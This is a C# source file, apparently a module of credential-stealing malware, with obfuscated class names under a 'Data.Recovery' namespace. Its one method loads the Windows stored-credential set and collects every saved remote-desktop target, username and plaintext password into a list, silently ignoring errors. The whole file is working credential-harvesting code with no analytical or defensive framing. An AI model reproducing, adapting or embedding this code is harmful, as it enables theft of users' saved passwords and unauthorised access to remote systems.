using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.CredentialManagement;
using NoiseMe.Drags.App.Models.Credentials;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Data.Recovery
{
	public class j6cd : GH9kf<RdpCredential>
	{
		public List<RdpCredential> EnumerateData()
		{
			List<RdpCredential> list = new List<RdpCredential>();
			try
			{
				CredentialSet credentialSet = new CredentialSet().Load();
				for (int i = 0; i < ((credentialSet != null) ? new int?(credentialSet.Count) : null); i++)
				{
					list.Add(new RdpCredential
					{
						Target = credentialSet[i]?.Target,
						Password = (string.IsNullOrEmpty(credentialSet[i]?.Password) ? "NOT SAVED" : credentialSet[i].Password),
						Username = (string.IsNullOrEmpty(credentialSet[i]?.Username) ? "NOT SAVED" : credentialSet[i].Username)
					});
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
	}
}
